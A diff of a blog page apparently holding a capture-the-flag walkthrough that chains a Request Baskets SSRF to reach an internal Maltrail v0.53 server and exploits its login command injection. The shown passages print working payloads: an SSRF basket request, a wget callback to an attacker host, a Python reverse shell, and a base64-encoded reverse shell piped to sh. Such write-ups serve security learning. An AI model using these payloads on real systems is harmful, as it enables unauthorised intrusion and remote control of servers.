@@ -55,6 +55,10 @@ We see that there’s 3 ports opened:
   <link rel="stylesheet" type="text/css" href="/css/styles.css">
 
   
+    <link rel="stylesheet" href="/css/custom_01.css">
+  
+    <link rel="stylesheet" href="/css/custom_02.css">
+  
 
   
   
@@ -257,8 +261,9 @@ We see that there’s 3 ports opened:
 <p>To summarize the article, we can take advantage of the baskets the web app creates to forward requests to internal network resources. So we could gain access to port <code>80</code> on the target by exploiting this SSRF! You can find more information about the Bash script that exploits this vulnerability <a href="https://github.com/entr0pie/CVE-2023-27163">here</a>, but the core part of it is this command:</p>
 <p><code>curl -s -X POST -H 'Content-Type: application/json' -d '{&quot;forward_url&quot;: &quot;http://127.0.0.1:80/&quot;,&quot;proxy_response&quot;: true,&quot;insecure_tls&quot;: false,&quot;expand_path&quot;: true,&quot;capacity&quot;: 250}' &quot;http://&lt;Target IP Address&gt;:55555/api/baskets/&lt;random value&gt;&quot;</code></p>
 <p>All this command is doing is making a <code>POST</code> request to create a basket with a random value as the basket name, then using a custom payload that will essentially allow our request to the newly created basket to be routed to the internal network on port <code>80</code>. The custom payload is:</p>
-<pre tabindex="0"><code>{&quot;forward_url&quot;: &quot;http://127.0.0.1:80/&quot;,&quot;proxy_response&quot;: true,&quot;insecure_tls&quot;: false,&quot;expand_path&quot;: true,&quot;capacity&quot;: 250}
-</code></pre><p>We could recreate this request in Burpsuite and it would look like this:</p>
+<pre><code>{&quot;forward_url&quot;: &quot;http://127.0.0.1:80/&quot;,&quot;proxy_response&quot;: true,&quot;insecure_tls&quot;: false,&quot;expand_path&quot;: true,&quot;capacity&quot;: 250}
+</code></pre>
+<p>We could recreate this request in Burpsuite and it would look like this:</p>
 <p><img src="https://i.imgur.com/i2CJ7Ry.png" alt=""></p>
 <p>Then we could simply go to the URL of the API basket:</p>
 <p><img src="https://i.imgur.com/F0oAP3R.png" alt=""></p>
@@ -267,20 +272,24 @@ We see that there’s 3 ports opened:
 <p>And we&rsquo;re able to access the service running on port 80! It&rsquo;s a <code>MailTrail v0.53</code> server!</p>
 <p>Searching for vulnerabilities within this version of Mailtrail, we&rsquo;ll find that the username parameter within the login page allows us to execute commands. There&rsquo;s various exploits, such as <a href="https://github.com/spookier/Maltrail-v0.53-Exploit">this one</a> which runs <code>curl</code> in order to exploit it by adding a semicolon at the end of the <code>username</code> parameter.</p>
 <p>The actual vulnerability is listed on <a href="https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">huntr.dev here</a> and as you can see, there&rsquo;s even an example payload:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#39;http://hostname:8338/login&#39;</span> <span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span>  --data <span style="color:#e6db74">&#39;username=;`id &gt; /tmp/bbq`&#39;</span>
-</code></pre></div><p>Let&rsquo;s take this and attempt to run the <code>whoami</code> command with this payload:</p>
+<pre><code class="language-bash">curl 'http://hostname:8338/login' \
+  --data 'username=;`id &gt; /tmp/bbq`'
+</code></pre>
+<p>Let&rsquo;s take this and attempt to run the <code>whoami</code> command with this payload:</p>
 <p><img src="https://i.imgur.com/glhSVTg.png" alt=""></p>
 <p>We don&rsquo;t get any output from the command, so it seems like we have blind OS command injection. We can confirm this by setting up a simple Python web server, then using a payload that makes a <code>GET</code> request to our Python server!</p>
 <p>First, let&rsquo;s run the python server: <code>python3 -m http.server</code>, then our payload would be:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#39;http://10.10.11.224:55555/j5wj8A0/login&#39;</span> <span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span>  --data <span style="color:#e6db74">&#39;username=;`wget http://&lt;Attacker IP Address&gt;:8000`&#39;</span>
-</code></pre></div><p><img src="https://i.imgur.com/OIj8xGD.png" alt=""></p>
+<pre><code class="language-bash">curl 'http://10.10.11.224:55555/j5wj8A0/login' \
+  --data 'username=;`wget http://&lt;Attacker IP Address&gt;:8000`'
+</code></pre>
+<p><img src="https://i.imgur.com/OIj8xGD.png" alt=""></p>
 <p>As you can see, it is indeed blind OS command injection! Let&rsquo;s use a reverse shell payload using Python3:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;Attacker IP Address&gt;&#34;,&lt;Attacker Listening Port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
-</code></pre></div><p>Then base64 encode it, then let&rsquo;s add it to our curl requests as follows:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#39;http://10.10.11.224:55555/j5wj8A0/login&#39;</span> --data <span style="color:#e6db74">&#39;username=;`echo+&#34;cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0Ljk2Iiw2MDAxKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn=&#34;+|+base64+-d+|+sh`&#39;</span>
-</code></pre></div><p><em>note: notice how we removed all spaces &amp; replaced them with addition symbols instead, we did this since we&rsquo;re making a GET request</em></p>
+<pre><code class="language-python3">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;Attacker IP Address&gt;&quot;,&lt;Attacker Listening Port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+</code></pre>
+<p>Then base64 encode it, then let&rsquo;s add it to our curl requests as follows:</p>
+<pre><code class="language-bash">curl 'http://10.10.11.224:55555/j5wj8A0/login' --data 'username=;`echo+&quot;cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0Ljk2Iiw2MDAxKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn=&quot;+|+base64+-d+|+sh`'
+</code></pre>
+<p><em>note: notice how we removed all spaces &amp; replaced them with addition symbols instead, we did this since we&rsquo;re making a GET request</em></p>
 <p><img src="https://i.imgur.com/7pkRdmk.png" alt=""></p>
 <p>And as you can see, we got a shell! Let&rsquo;s upgrade our shell by running <code>python3 -c import 'pty;pty.spawn(&quot;/bin/bash&quot;);'</code></p>
 <p>Let&rsquo;s move onto the privilege escalation component!</p>
@@ -334,6 +343,10 @@ We see that there’s 3 ports opened:
 <link rel="stylesheet" href="/css/search.fe0cd54a21628574bff49d721c827d1bb165ab56b0f22dd55ae78addbe61c309.css"></link>
 
 
+
+  <script src="/js/custom_01.js"></script>
+
+  <script src="/js/custom_02.js"></script>
 
 
     
